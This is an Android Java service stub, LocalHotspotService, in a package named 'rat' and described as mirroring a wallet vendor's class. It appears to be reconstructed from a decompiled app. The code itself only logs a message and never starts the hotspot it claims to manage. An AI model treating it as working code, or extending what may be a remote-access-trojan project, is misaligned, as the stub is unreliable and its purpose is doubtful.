package com.vendor.rat.service;

import android.app.Service;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

/**
 * Vendor: com.guard.wallet.service.LocalHotspotService
 * Manages local-only WiFi hotspot for device connectivity.
 */
public class LocalHotspotService extends Service {

    public static final int b = 0;
    public WifiManager.LocalOnlyHotspotReservation reservation;

    @Override
    public final IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public final void onDestroy() {
        super.onDestroy();
        if (reservation != null) {
            reservation.close();
        }
    }

    @Override
    public final int onStartCommand(Intent intent, int flags, int startId) {
        // ADAPT: vendor uses a0.e callback class
        // TODO: VENDOR_VERIFY - hotspot callback implementation
        WifiManager wifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
        if (wifiManager == null) {
            return START_STICKY;
        }
        Log.d("LocalHotspotService", "onStartCommand - hotspot start requested");
        return START_STICKY;
    }
}
